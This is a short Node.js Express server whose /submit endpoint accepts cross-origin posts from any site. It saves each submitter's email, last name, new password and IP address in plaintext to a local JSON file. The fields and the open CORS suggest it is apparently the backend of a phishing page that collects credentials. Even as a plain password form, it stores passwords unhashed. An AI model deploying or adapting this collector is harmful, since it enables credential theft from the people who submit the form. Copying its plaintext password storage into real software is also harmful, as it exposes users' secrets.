const express = require("express");
const fs = require("fs");
const cors = require("cors"); // ✅ ADD THIS

const app = express();

app.use(cors()); // ✅ VERY IMPORTANT
app.use(express.json());
app.post("/submit", (req, res) => {
  const entry = {
    email: req.body.email,
    lastname: req.body.lastname,
    newPassword: req.body.newPassword,
    timestamp: new Date(),
    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress
  };

  let data = [];

  if (fs.existsSync("data.json")) {
    data = JSON.parse(fs.readFileSync("data.json"));
  }

  data.push(entry);

  fs.writeFileSync("data.json", JSON.stringify(data, null, 2));

  res.json({ message: "Saved" });
});

app.listen(3000, () => console.log("Server running on port 3000"));